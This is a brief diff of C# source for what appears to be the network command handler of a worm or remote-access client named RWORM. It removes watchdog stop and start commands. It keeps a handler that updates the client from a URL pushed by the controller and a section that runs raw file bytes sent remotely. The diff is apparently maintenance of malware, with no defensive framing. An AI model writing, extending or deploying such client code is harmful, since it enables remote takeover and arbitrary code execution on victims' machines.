@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Text;
@@ -394,12 +394,6 @@ namespace RWORM.Client.Network
                     break;
                 case 0xA2: // CLIENT_UPDATE — payload = URL
                     await LoaderModule.Update(txt());
-                    break;
-                case 0xA5: // WATCHDOG_STOP
-                    Watchdog.StopWatchdog();
-                    break;
-                case 0xA6: // WATCHDOG_START
-                    Watchdog.StartWatchdog();
                     break;
 
                 // ── Task: run raw file bytes ───────────────────────────────
